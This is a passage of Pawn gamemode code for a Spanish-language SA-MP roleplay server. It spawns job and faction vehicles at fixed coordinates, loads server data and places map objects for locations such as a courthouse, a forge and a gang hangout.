	CreateJobVehicle(ID_Camionero|459,2537.89990234,-2098.89990234,13.69999981,90.00000000,-1,-1, 60*5); //Berkley's RC Van
	CreateJobVehicle(ID_Camionero|459,2537.60009766,-2104.39990234,13.69999981,90.00000000,-1,-1, 60*5); //Berkley's RC Van
	CreateJobVehicle(ID_Camionero|459,2537.39990234,-2109.69995117,13.69999981,90.00000000,-1,-1, 60*5); //Berkley's RC Van

	//                    AUTOS LICENCIA
	LicenciaAuto[0] = CreateVehicle(426,1414.80004883,-44.59999847,1000.70001221,90.00000000,80,80,15); //Premier
	LicenciaAuto[1] = CreateVehicle(426,1414.80004883,-38.79999924,1000.70001221,90.00000000,80,80,15); //Premier
	LicenciaAuto[2] = CreateVehicle(426,1414.80004883,-33.20000076,1000.70001221,90.00000000,80,80,15); //Premier

	LicenciaMoto[0] = CreateVehicle(521,1414.80004883,-44.59999847,1000.70001221,90.00000000,80,80,15); //Premier
	LicenciaMoto[1] = CreateVehicle(521,1414.80004883,-38.79999924,1000.70001221,90.00000000,80,80,15); //Premier
	LicenciaMoto[2] = CreateVehicle(521,1414.80004883,-33.20000076,1000.70001221,90.00000000,80,80,15); //Premier

	Loop(i,3,0)
	{
		LinkVehicleToInterior(LicenciaAuto[i],1);
		SetVehicleVirtualWorld(LicenciaAuto[i],1);
	}
	Loop(i,3,0)
	{
		LinkVehicleToInterior(LicenciaMoto[i],1);
		SetVehicleVirtualWorld(LicenciaMoto[i],2);
	}

	//                      COSECHADORAS                    //
	CreateJobVehicle(ID_Cosechador|532,-375.9665, -1531.9557, 23.6264, -85.6800,6,6,60*5); // Cosechadora
	CreateJobVehicle(ID_Cosechador|532,-374.4462, -1544.0831, 23.6264, -85.6800,6,6,60*5); // Cosechadora
	CreateJobVehicle(ID_Cosechador|532,-373.4890, -1556.3516, 23.6264, -85.6800,6,6,60*5); // Cosechadora
	CreateJobVehicle(ID_Cosechador|532,-378.1626, -1522.9635, 23.6264, -70.0200,6,6,60*5); // Cosechadora

	//                      LSTV                            //
	CreateFactionVehicle(IDLSTV|487,739.09997559,-1375.50000000,26.00000000,90.00000000,-1,-1); //Maverick
	CreateFactionVehicle(IDLSTV|488,744.09997559,-1364.50000000,26.00000000,92.00000000,-1,-1); //News Chopper
	CreateFactionVehicle(IDLSTV|582,758.79998779,-1343.80004883,13.69999981,270.00000000,103,103); //Newsvan
	CreateFactionVehicle(IDLSTV|582,750.40002441,-1335.00000000,13.69999981,90.00000000,103,103); //Newsvan
	CreateFactionVehicle(IDLSTV|582,750.09997559,-1340.09997559,13.69999981,90.00000000,103,103); //Newsvan
	CreateFactionVehicle(IDLSTV|582,749.70001221,-1343.69995117,13.69999981,90.00000000,103,103); //Newsvan
	CreateFactionVehicle(IDLSTV|559,735.59997559,-1336.50000000,13.30000019,180.00000000,103,103); //Jester
	CreateFactionVehicle(IDLSTV|461,758.29998779,-1340.00000000,13.19999981,270.00000000,103,1); //PCJ-600
	CreateFactionVehicle(IDLSTV|461,758.20001221,-1334.30004883,13.19999981,270.00000000,103,1); //PCJ-600
	CreateFactionVehicle(IDLSTV|559,740.09997559,-1336.50000000,13.30000019,180.00000000,103,1); //Jester
	CreateFactionVehicle(IDLSTV|409,759.09997559,-1337.00000000,13.50000000,270.00000000,106,1); //Stretch

	//                  MECANICOS                       //
	CreateFactionVehicle(IDMECANICOS|525,1794.19995117,-2048.30004883,13.60000038,302.00000000,0,3); //Tow Truck
	CreateFactionVehicle(IDMECANICOS|525,1794.09997559,-2044.09997559,13.60000038,301.99768066,0,3); //Tow Truck
	CreateFactionVehicle(IDMECANICOS|525,1794.09997559,-2039.90002441,13.60000038,301.99768066,0,3); //Tow Truck
	CreateFactionVehicle(IDMECANICOS|525,1794.19995117,-2035.50000000,13.60000038,301.99768066,0,3); //Tow Truck
	CreateFactionVehicle(IDMECANICOS|525,1794.19995117,-2031.19995117,13.60000038,301.99768066,0,3); //Tow Truck

	//              BICIS TRABAJO REPARTIDOR                //
	CreateJobVehicle(ID_RepartidorB|509,2035.2075,-1295.0660,20.4456,90.2665,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2034.9890,-1300.1499,20.4312,90.1729,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2035.0818,-1304.8444,20.4182,90.0780,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2035.1302,-1290.2566,20.4581,92.2842,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2035.2446,-1285.1028,20.4720,93.1096,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2025.1853,-1301.4414,20.4031,184.4070,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2025.1450,-1296.8195,20.4210,179.4778,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2025.1860,-1292.4224,20.4368,179.4332,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2025.2262,-1288.2374,20.4529,179.3936,1,1,60*5); // bici 1
	CreateJobVehicle(ID_RepartidorB|509,2025.2816,-1283.8074,20.4687,179.2912,1,1,60*5); // bici 1

	//              CAMIONES DE BASURA                //
	CreateJobVehicle(ID_Basurero|408,1238.30004883,-1250.59997559,16.89999962,270.00000000,-1,-1,60*5); //Trashmaster
	CreateJobVehicle(ID_Basurero|408,1252.59997559,-1267.09997559,16.89999962,270.00000000,-1,-1,60*5); //Trashmaster
	CreateJobVehicle(ID_Basurero|408,1252.90002441,-1261.90002441,16.89999962,270.00000000,-1,-1,60*5); //Trashmaster
	CreateJobVehicle(ID_Basurero|408,1252.69995117,-1256.09997559,16.89999962,270.00000000,-1,-1,60*5); //Trashmaster
	CreateJobVehicle(ID_Basurero|408,1262.50000000,-1255.69995117,16.39999962,270.00000000,-1,-1,60*5); //Trashmaster
	CreateJobVehicle(ID_Basurero|408,1263.00000000,-1261.90002441,16.39999962,270.00000000,-1,-1,60*5); //Trashmaster
	CreateJobVehicle(ID_Basurero|408,1263.09997559,-1266.90002441,16.39999962,270.00000000,-1,-1,60*5); //Trashmaster
	CreateJobVehicle(ID_Basurero|408,1279.30004883,-1238.30004883,16.39999962,180.00000000,-1,-1,60*5); //Trashmaster

	//              AUTOS DEL GOBIERNO          //
	CreateFactionVehicle(IDGOBIERNO|490,1274.50000000,-2040.50000000,59.40000153,90.00000000,0,1); //FBI Rancher
	CreateFactionVehicle(IDGOBIERNO|490,1274.59997559,-2032.80004883,59.40000153,90.00000000,0,1); //FBI Rancher
	CreateFactionVehicle(IDGOBIERNO|409,1247.19995117,-2011.69995117,59.70000076,180.00000000,0,1); //Stretch
	CreateFactionVehicle(IDGOBIERNO|523,1247.00000000,-2023.59997559,59.50000000,270.00024414,0,1); //HPV1000
	CreateFactionVehicle(IDGOBIERNO|523,1247.19995117,-2027.59997559,59.50000000,270.00000000,0,1); //HPV1000
	CreateFactionVehicle(IDGOBIERNO|411,1247.80004883,-2033.09997559,59.59999847,270.00000000,0,1); //Infernus
	CreateFactionVehicle(IDGOBIERNO|411,1247.69995117,-2040.80004883,59.59999847,270.00000000,0,1); //Infernus
	CreateFactionVehicle(IDGOBIERNO|560,1275.09997559,-2025.90002441,58.79999924,90.00000000,0,1); //Sultan
	CreateFactionVehicle(IDGOBIERNO|560,1275.40002441,-2019.09997559,58.79999924,90.00000000,0,1); //Sultan
	CreateFactionVehicle(IDGOBIERNO|421,1274.40002441,-2012.40002441,59.00000000,90.00000000,0,1); //Washington
	CreateFactionVehicle(IDGOBIERNO|563,1195.59997559,-2019.09997559,69.90000153,270.00000000,0,1); //Raindance
	CreateFactionVehicle(IDGOBIERNO|563,1196.50000000,-2053.80004883,69.90000153,270.00000000,0,1); //Raindance
	CreateFactionVehicle(IDGOBIERNO|417,1152.90002441,-2019.59997559,68.00000000,270.00000000,0,1); //Leviathan
	CreateFactionVehicle(IDGOBIERNO|417,1153.00000000,-2055.30004883,68.00000000,270.00000000,0,1); //Leviathan

	//              HITMAN              //
	CreateFactionVehicle(IDHITMAN|560,278.7000122,-1534.9000244,24.3999996,235.9973145,0,0); //Sultan
	CreateFactionVehicle(IDHITMAN|482,284.5000000,-1526.1999512,24.7999992,236.0000000,0,0); //Burrito
	CreateFactionVehicle(IDHITMAN|554,288.1000061,-1521.0000000,24.7999992,236.0000000,0,0); //Yosemite
	CreateFactionVehicle(IDHITMAN|415,300.6000061,-1503.1999512,24.5000000,236.0000000,0,0); //Cheetah
	CreateFactionVehicle(IDHITMAN|477,297.6000061,-1507.9000244,24.5000000,235.5000000,0,0); //ZR-350
	CreateFactionVehicle(IDHITMAN|409,300.6000061,-1491.6999512,24.5000000,236.0000000,0,0); //Stretch
	CreateFactionVehicle(IDHITMAN|521,304.6000061,-1486.5999756,24.2999992,236.0000000,0,0); //FCR-900

	//              CAMIONEROS LVL: 2              //
	CreateJobVehicle(ID_Camionero|515, -474.2061, -474.0198, 26.7533, 179.2200, -1, -1, 100);
	CreateJobVehicle(ID_Camionero|515, -484.1528, -473.7698, 26.7533, 179.2200, -1, -1, 100);
	CreateJobVehicle(ID_Camionero|515, -494.7004, -474.0380, 26.7533, 179.2200, -1, -1, 100);
	CreateJobVehicle(ID_Camionero|515, -504.6794, -473.8775, 26.7533, 179.2200, -1, -1, 100);
	CreateJobVehicle(ID_Camionero|515, -514.8195, -473.8259, 26.7533, 179.2200, -1, -1, 100);
	CreateJobVehicle(ID_Camionero|515, -524.5757, -473.9580, 26.7533, 179.2200, -1, -1, 100);

	//              CAMIONEROS LVL 2 (CARGAS)             //
	CreateVehicle(435, -978.8101, -684.2756, 32.8219, 88.7119, -1, -1, 100);
	CreateVehicle(435, -978.7954, -674.3043, 32.8219, 88.7119, -1, -1, 100);
	CreateVehicle(435, -978.6477, -664.0270, 32.8219, 88.7119, -1, -1, 100);
	CreateVehicle(435, -978.6447, -653.5461, 32.8219, 88.7119, -1, -1, 100);
	CreateVehicle(435, -978.5058, -643.5342, 32.8219, 88.7119, -1, -1, 100);

	CreateVehicle(450, 2587.1094, 2772.2971, 12.2551, 89.7000, -1, -1, 100);
	CreateVehicle(450, 2586.9614, 2764.7866, 12.2551, 89.7000, -1, -1, 100);
	CreateVehicle(450, 2587.1038, 2756.6685, 12.2551, 89.7000, -1, -1, 100);
	CreateVehicle(450, 2587.1763, 2748.6216, 12.2551, 89.7000, -1, -1, 100);
	CreateVehicle(450, 2586.8013, 2740.2673, 12.2551, 89.7000, -1, -1, 100);

	CreateVehicle(591, 284.3467, 1340.9998, 12.1626, 0.0000, -1, -1, 100);
	CreateVehicle(591, 277.9458, 1340.9329, 12.1626, 0.0000, -1, -1, 100);
 	CreateVehicle(591, 271.3472, 1341.0750, 12.1626, 0.0000, -1, -1, 100);
	CreateVehicle(591, 264.2848, 1341.0283, 12.1626, 0.0000, -1, -1, 100);
	CreateVehicle(591, 258.0042, 1341.0635, 12.1626, 0.0000, -1, -1, 100);

	//              REPARTIDOR DE PIZZA                 //
	CreateJobVehicle(ID_RepartidorP|448,2113.1201,-1824.5374,13.1553,178.1092, 6, 3, 200);
	CreateJobVehicle(ID_RepartidorP|448,2116.7688,-1824.6216,13.1560,183.3079, 6, 3, 200);
	CreateJobVehicle(ID_RepartidorP|448,2120.4487,-1824.6055,13.1558,177.1241, 6, 3, 200);
	CreateJobVehicle(ID_RepartidorP|448,2109.4717,-1824.6201,13.1551,181.8205, 6, 3, 200);

	foreach(Vehicle, i)
	{
	    if(Veh[i][vFaccion])
	    {
	        CerrarPuertas(i);
		}
	}

	// ---====[ Cargado de datos ]====---- //

    CargarVehiculos();
   	CargarInteriores();
	CargarFacciones();
	CargarNegocios();
	CargarCasas();
	CargarInteriores_C();
	CargarFamilias();
	CargarGarages();
	CargarCuentasBancarias();
	CargarObjetos();
	CargarPortones();
	CargarTelevisores();
	CargarModelos();
	CargarGangZones();
	CargarContratos();
	CrearMinerales();
	CargarNPCS();

	//  -------=========[ MAPS ]=========------- //

	//                      CARCEL                                          //
	CreateDynamicObject(18856, 424.38, -2481.58, -27.49,   0.00, 0.00, 0.20);
	
	//                      HERRERIA                                        //
	CreateDynamicObject(18045, 259.67, -92.96, 1002.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(18045, 259.20, -98.68, 1002.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(971, 250.70, -95.96, 1001.69,   -91.00, 0.00, -91.00);
	CreateDynamicObject(1497, 961.06, 2146.09, 1011.03,   0.00, 0.00, 0.00);
	CreateDynamicObject(14584, 253.11, -113.68, 1001.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(18553, 252.79, -93.54, 1000.48,   0.00, 90.00, -0.96);
	CreateDynamicObject(18553, 252.72, -96.57, 1000.61,   0.00, 90.00, -0.18);
	CreateDynamicObject(18553, 252.69, -92.69, 1000.67,   0.00, -90.00, 540.30);
	CreateDynamicObject(18553, 251.97, -93.45, 1000.71,   0.00, 0.00, 89.76);
	CreateDynamicObject(18553, 252.10, -98.15, 1000.71,   0.00, 0.00, 89.76);
	CreateDynamicObject(18553, 252.26, -96.48, 1000.71,   0.00, 0.00, 179.28);
	CreateDynamicObject(18553, 252.24, -92.60, 1000.71,   0.00, 0.00, 179.28);
	CreateDynamicObject(1497, 264.66, -97.51, 1000.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(19131, 265.04, -93.38, 1001.76,   0.00, 0.00, 269.74);
	CreateDynamicObject(19131, 261.66, -93.37, 1001.76,   0.00, 0.00, 269.74);
	CreateDynamicObject(19131, 258.62, -93.49, 1001.76,   0.00, 0.00, 269.74);
	CreateDynamicObject(3461, 260.44, -93.96, 1001.76,   0.00, 0.00, 0.00);
	CreateDynamicObject(3461, 263.67, -93.96, 1001.76,   0.00, 0.00, 0.00);

	//                      PIZZA ATRAS                                     //
	CreateDynamicObject(3034, 2121.6001, -1822.31006, 14.6, 0, 0, 0);
	CreateDynamicObject(2395, 2120.18994, -1822.69995, 13.69999, 270, 0, 0);

	//                      Puerta juzgado  EXT                              //
	CreateDynamicObject(19176, 1411.369262,-1699.351684,14.059483,0,0,54.59999);

	//                         	 	JUZGADO                         //
	CreateDynamicObject_e(11244,839.0000000,116.0999985,977.5999756,0.0000000,0.0000000,270.0000000); //object(gen_whouse02_sfs01) (1)
	CreateDynamicObject_e(13078,841.4000244,117.9000015,985.7999878,0.0000000,180.0000000,0.0000000); //object(cewrehse07) (1)
	CreateDynamicObject_e(18462,825.5000000,119.9000015,982.0999756,0.0000000,0.0000000,0.0000000); //object(cs_detrok10) (1)
	CreateDynamicObject_e(18462,825.5000000,110.3000031,982.0999756,0.0000000,0.0000000,0.0000000); //object(cs_detrok10) (2)
	CreateDynamicObject_e(18462,830.2999878,124.8000031,982.0999756,0.0000000,0.0000000,270.0000000); //object(cs_detrok10) (3)
	CreateDynamicObject_e(18462,834.5999756,120.8000031,982.0999756,0.0000000,0.0000000,180.0000000); //object(cs_detrok10) (4)
	CreateDynamicObject_e(18462,839.4000244,116.0999985,982.0999756,0.0000000,0.0000000,269.9945068); //object(cs_detrok10) (5)
	CreateDynamicObject_e(18462,849.0000000,116.0999985,982.0999756,0.0000000,0.0000000,269.9890137); //object(cs_detrok10) (6)
	CreateDynamicObject_e(18462,852.5999756,111.5000000,982.0999756,0.0000000,0.0000000,179.9890137); //object(cs_detrok10) (7)
	CreateDynamicObject_e(18462,848.0999756,106.9000015,982.0999756,0.0000000,0.0000000,90.0000000); //object(cs_detrok10) (8)
	CreateDynamicObject_e(18462,838.5000000,106.9000015,982.0999756,0.0000000,0.0000000,90.0000000); //object(cs_detrok10) (9)
	CreateDynamicObject_e(18462,829.0000000,106.9000015,982.0999756,0.0000000,0.0000000,90.0000000); //object(cs_detrok10) (10)
	CreateDynamicObject_e(18460,850.7999878,111.5000000,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (1)
	CreateDynamicObject_e(18460,847.2999878,111.5000000,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (2)
	CreateDynamicObject_e(18460,843.7999878,111.5000000,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (3)
	CreateDynamicObject_e(18460,840.2999878,111.5000000,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (4)
	CreateDynamicObject_e(18460,836.7999878,111.5000000,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (5)
	CreateDynamicObject_e(18460,833.2999878,111.5000000,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (6)
	CreateDynamicObject_e(18460,829.7999878,111.5000000,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (7)
	CreateDynamicObject_e(18460,826.2999878,111.5000000,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (8)
	CreateDynamicObject_e(18460,826.5000000,121.0999985,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (9)
	CreateDynamicObject_e(18460,830.0000000,121.0999985,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (10)
	CreateDynamicObject_e(18460,833.5000000,121.0999985,980.4000244,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (11)
	CreateDynamicObject_e(16012,830.0000000,124.4000015,982.0000000,0.0000000,0.0000000,0.0000000); //object(des_ntcafe) (1)
	CreateDynamicObject_e(18608,843.4000244,114.1999969,984.0999756,0.0000000,0.0000000,270.0000000); //object(counts_lights01) (1)
	CreateDynamicObject_e(18608,843.0000000,109.6999969,984.0999756,0.0000000,0.0000000,270.0000000); //object(counts_lights01) (2)
	CreateDynamicObject_e(11245,839.5999756,115.9000015,982.0999756,0.0000000,0.0000000,0.0000000); //object(sfsefirehseflag) (1)
	CreateDynamicObject_e(11245,839.7999878,107.0999985,982.0999756,0.0000000,0.0000000,0.0000000); //object(sfsefirehseflag) (2)
	CreateDynamicObject_e(2435,849.0000000,112.8000031,980.5000000,0.0000000,0.0000000,270.0000000); //object(cj_ff_conter_2) (1)
	CreateDynamicObject_e(2435,849.0000000,111.9000015,980.5000000,0.0000000,0.0000000,270.0000000); //object(cj_ff_conter_2) (2)
	CreateDynamicObject_e(2435,849.0000000,111.0000000,980.5000000,0.0000000,0.0000000,270.0000000); //object(cj_ff_conter_2) (3)
	CreateDynamicObject_e(2435,849.0000000,110.0999985,980.5000000,0.0000000,0.0000000,270.0000000); //object(cj_ff_conter_2) (4)
	CreateDynamicObject_e(18460,851.2000122,111.5000000,980.5000000,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (12)
	CreateDynamicObject_e(18460,851.2000122,111.5000000,980.5999756,0.0000000,270.0000000,0.0000000); //object(cs_detrok08) (13)
	CreateDynamicObject_e(1714,850.7000122,111.5000000,980.7000122,0.0000000,0.0000000,270.0000000); //object(kb_swivelchair1) (1)
	CreateDynamicObject_e(1714,848.5999756,108.4000015,980.5000000,0.0000000,0.0000000,270.0000000); //object(kb_swivelchair1) (2)
	CreateDynamicObject_e(1714,848.7000122,114.5999985,980.5000000,0.0000000,0.0000000,270.0000000); //object(kb_swivelchair1) (3)
	CreateDynamicObject_e(2435,844.2999878,107.4000015,980.2999878,0.0000000,0.0000000,90.0000000); //object(cj_ff_conter_2) (5)
	CreateDynamicObject_e(2435,844.2999878,108.3000031,980.2999878,0.0000000,0.0000000,90.0000000); //object(cj_ff_conter_2) (6)
	CreateDynamicObject_e(2435,844.2999878,115.5999985,980.2999878,0.0000000,0.0000000,90.0000000); //object(cj_ff_conter_2) (7)
	CreateDynamicObject_e(2435,844.2999878,114.6999969,980.2999878,0.0000000,0.0000000,90.0000000); //object(cj_ff_conter_2) (8)
	CreateDynamicObject_e(1671,842.9000244,107.9000015,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_a) (1)
	CreateDynamicObject_e(1671,843.0999756,115.0999985,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_a) (2)
	CreateDynamicObject_e(1663,839.0999756,115.0000000,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (1)
	CreateDynamicObject_e(1663,839.0999756,114.3000031,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (2)
	CreateDynamicObject_e(1663,839.0999756,113.5000000,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (3)
	CreateDynamicObject_e(1663,839.0000000,109.5999985,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (4)
	CreateDynamicObject_e(1663,839.0000000,108.6999969,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (5)
	CreateDynamicObject_e(1663,839.0000000,107.9000015,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (6)
	CreateDynamicObject_e(1663,837.0999756,113.4000015,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (7)
	CreateDynamicObject_e(1663,837.0999756,114.3000031,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (8)
	CreateDynamicObject_e(1663,837.0999756,115.0000000,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (9)
	CreateDynamicObject_e(1663,837.2999878,109.5999985,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (10)
	CreateDynamicObject_e(1663,837.2999878,108.8000031,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (11)
	CreateDynamicObject_e(1663,837.2999878,108.0000000,980.9000244,0.0000000,0.0000000,90.0000000); //object(swivelchair_b) (12)
	CreateDynamicObject_e(2773,838.2000122,110.6999969,981.0000000,0.0000000,0.0000000,270.0000000); //object(cj_airprt_bar) (1)
	CreateDynamicObject_e(2773,838.2000122,112.6999969,981.0000000,0.0000000,0.0000000,270.0000000); //object(cj_airprt_bar) (2)
	CreateDynamicObject_e(2773,841.2000122,112.6999969,981.0000000,0.0000000,0.0000000,270.0000000); //object(cj_airprt_bar) (3)
	CreateDynamicObject_e(2773,841.2000122,110.6999969,981.0000000,0.0000000,0.0000000,270.0000000); //object(cj_airprt_bar) (4)
	CreateDynamicObject_e(2773,835.4000244,110.6999969,981.0000000,0.0000000,0.0000000,270.0000000); //object(cj_airprt_bar) (5)
	CreateDynamicObject_e(2773,835.5000000,112.6999969,981.0000000,0.0000000,0.0000000,270.0000000); //object(cj_airprt_bar) (6)
	CreateDynamicObject_e(2775,852.2000122,111.5999985,982.7999878,0.0000000,0.0000000,270.0000000); //object(cj_airprt_mon) (1)
	CreateDynamicObject_e(630,832.5999756,123.5999985,981.5000000,0.0000000,0.0000000,0.0000000); //object(veg_palmkb8) (1)
	CreateDynamicObject_e(630,827.5000000,123.8000031,981.5000000,0.0000000,0.0000000,0.0000000); //object(veg_palmkb8) (2)
	CreateDynamicObject_e(630,834.0000000,116.3000031,981.5000000,0.0000000,0.0000000,0.0000000); //object(veg_palmkb8) (4)
	CreateDynamicObject_e(1892,831.7999878,116.0999985,980.5000000,0.0000000,0.0000000,0.0000000); //object(security_gatsh) (1)
	CreateDynamicObject_e(1892,826.7999878,116.0999985,980.5000000,0.0000000,0.0000000,0.0000000); //object(security_gatsh) (2)
	CreateDynamicObject_e(2185,830.5999756,116.0000000,980.5000000,0.0000000,0.0000000,180.0000000); //object(med_office6_desk_1) (1)
	CreateDynamicObject_e(1663,830.0000000,115.0999985,980.9000244,0.0000000,0.0000000,180.0000000); //object(swivelchair_b) (13)

	//          			COSECHADORES                        			//
	CreateDynamicObject(3276, -378.47, -1516.44, 22.63,   3.14, 0.00, 25.48);
	CreateDynamicObject(3276, -381.59, -1526.81, 22.02,   3.14, 0.00, -78.14);
	CreateDynamicObject(3276, -378.95, -1540.56, 21.61,   3.14, 0.00, -83.96);
	CreateDynamicObject(3276, -377.42, -1554.44, 21.31,   3.14, 0.00, -83.96);
	CreateDynamicObject(3276, -371.16, -1562.53, 21.31,   3.14, 0.00, 3.28);
	CreateDynamicObject(1454, -382.81, -1519.87, 22.47,   356.86, 0.00, 12.22);
	CreateDynamicObject(1454, -379.94, -1533.47, 21.65,   356.86, 0.00, 12.22);
	CreateDynamicObject(1454, -378.42, -1547.55, 21.55,   356.86, 0.00, 0.10);
	CreateDynamicObject(1454, -376.99, -1561.50, 21.25,   356.86, 0.00, 2.14);
	CreateDynamicObject(693, -167.30, -1428.25, 4.42,   3.14, 0.00, 2.38);
	CreateDynamicObject(693, -184.21, -1289.66, 2.55,   3.14, 0.00, 2.38);
	CreateDynamicObject(693, -187.31, -1239.54, -6.17,   3.14, 0.00, 2.38);
	CreateDynamicObject(693, -263.69, -1271.39, -4.21,   3.14, 0.00, 2.38);
	CreateDynamicObject(693, -278.49, -1244.88, -4.21,   3.14, 0.00, 2.38);
	CreateDynamicObject(790, -167.60, -1261.53, 7.28,   3.14, 0.00, 1.37);
	CreateDynamicObject(684, -157.94, -1306.17, 2.45,   0.00, 0.00, 0.00);
	CreateDynamicObject(684, -159.10, -1316.56, 2.35,   0.00, 85.00, -18.00);
	CreateDynamicObject(833, -160.10, -1325.05, 2.95,   0.00, 0.00, 0.00);
	CreateDynamicObject(973, -157.98, -1333.41, 2.88,   0.00, 0.00, 264.06);
	CreateDynamicObject(973, -158.91, -1342.74, 2.88,   0.00, 0.00, 264.66);
	CreateDynamicObject(973, -159.58, -1352.09, 2.88,   0.00, 0.00, 267.00);
	CreateDynamicObject(973, -159.94, -1361.47, 2.88,   0.00, 0.00, 268.38);
	CreateDynamicObject(973, -159.90, -1370.86, 2.88,   0.00, 0.00, 272.16);
	CreateDynamicObject(973, -159.54, -1380.23, 2.88,   0.00, 0.00, 272.16);
	CreateDynamicObject(973, -158.92, -1389.57, 2.88,   0.00, 0.00, 275.46);
	CreateDynamicObject(973, -157.84, -1398.89, 2.88,   0.00, 0.00, 277.74);
	CreateDynamicObject(973, -156.38, -1408.15, 2.88,   0.00, 0.00, 280.44);
	CreateDynamicObject(973, -154.39, -1417.32, 2.88,   0.00, 0.00, 283.98);
	CreateDynamicObject(973, -151.71, -1426.31, 2.88,   0.00, 0.00, 289.26);
	CreateDynamicObject(973, -148.40, -1435.06, 2.88,   0.00, 0.00, 292.08);
	CreateDynamicObject(973, -144.56, -1443.59, 2.88,   0.00, 0.00, 296.64);
	CreateDynamicObject(833, -149.06, -1454.90, 2.95,   0.00, 0.00, -57.24);
	CreateDynamicObject(833, -144.87, -1450.83, 2.95,   0.00, 0.00, -89.58);
	CreateDynamicObject(684, -155.51, -1460.70, 6.24,   98.00, 164.00, -21.00);
	CreateDynamicObject(684, -158.59, -1464.81, 6.24,   98.00, 164.00, 52.02);
	CreateDynamicObject(684, -162.98, -1469.10, 6.24,   64.00, 164.00, 90.00);
	CreateDynamicObject(684, -168.26, -1472.95, 6.24,   64.00, 164.00, 268.98);
	CreateDynamicObject(833, -162.44, -1465.54, 5.78,   0.00, 0.00, -57.24);
	CreateDynamicObject(3425, -382.18, -1508.72, 32.61,   356.86, 0.00, 19.70);

	//            Sureños 13         //
	CreateDynamicObject(17513,1880.8000488,-2023.1999512,4.5000000,0.0000000,0.0000000,0.0000000); //object(lae2_ground04) (1)
	CreateDynamicObject(2114,1882.5999756,-2030.5000000,12.6000004,0.0000000,0.0000000,0.0000000); //object(basketball) (1)
	CreateDynamicObject(2114,1885.1999512,-2034.3000488,12.6000004,0.0000000,0.0000000,0.0000000); //object(basketball) (2)
	CreateDynamicObject(2114,1879.9000244,-2035.3000488,12.6000004,0.0000000,0.0000000,0.0000000); //object(basketball) (3)
	CreateDynamicObject(946,1882.5999756,-2039.1999512,14.6999998,0.0000000,0.0000000,0.0000000); //object(bskball_lax) (1)
	CreateDynamicObject(946,1882.6999512,-2019.0000000,14.6999998,0.0000000,0.0000000,180.0000000); //object(bskball_lax) (2)
	CreateDynamicObject(1594,1875.6999512,-2016.4000244,13.0000000,0.0000000,0.0000000,0.0000000); //object(chairsntable) (1)
	CreateDynamicObject(1594,1879.6999512,-2014.6999512,13.0000000,0.0000000,0.0000000,0.0000000); //object(chairsntable) (2)
	CreateDynamicObject(1670,1875.5999756,-2016.5000000,13.3999996,0.0000000,0.0000000,0.0000000); //object(propcollecttable) (1)
	CreateDynamicObject(1670,1879.6999512,-2014.8000488,13.3999996,0.0000000,0.0000000,0.0000000); //object(propcollecttable) (2)
	CreateDynamicObject(3119,1875.6999512,-2021.5999756,12.8000002,0.0000000,0.0000000,0.0000000); //object(cs_ry_props) (1)
	CreateDynamicObject(1440,1895.9000244,-2034.1999512,13.1000004,0.0000000,0.0000000,0.0000000); //object(dyn_box_pile_3) (1)
	CreateDynamicObject(1440,1870.9000244,-2035.5999756,13.1000004,0.0000000,0.0000000,0.0000000); //object(dyn_box_pile_3) (2)
	CreateDynamicObject(12957,1859.0999756,-2026.1999512,13.3999996,0.0000000,0.0000000,0.0000000); //object(sw_pickupwreck01) (1)
	CreateDynamicObject(2672,1889.8000488,-2024.9000244,12.8000002,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (1)
	CreateDynamicObject(2674,1889.9000244,-2021.0999756,12.6000004,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (1)
	CreateDynamicObject(2677,1890.4000244,-2028.3000488,12.8000002,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_7) (1)
	CreateDynamicObject(3594,1926.1999512,-2002.3000488,13.1999998,0.0000000,0.0000000,0.0000000); //object(la_fuckcar1) (1)
	CreateDynamicObject(1413,1925.8000488,-2042.5999756,13.8000002,0.0000000,0.0000000,0.0000000); //object(dyn_mesh_3) (1)
	CreateDynamicObject(1413,1920.5000000,-2042.5999756,13.8000002,0.0000000,0.0000000,0.0000000); //object(dyn_mesh_3) (2)
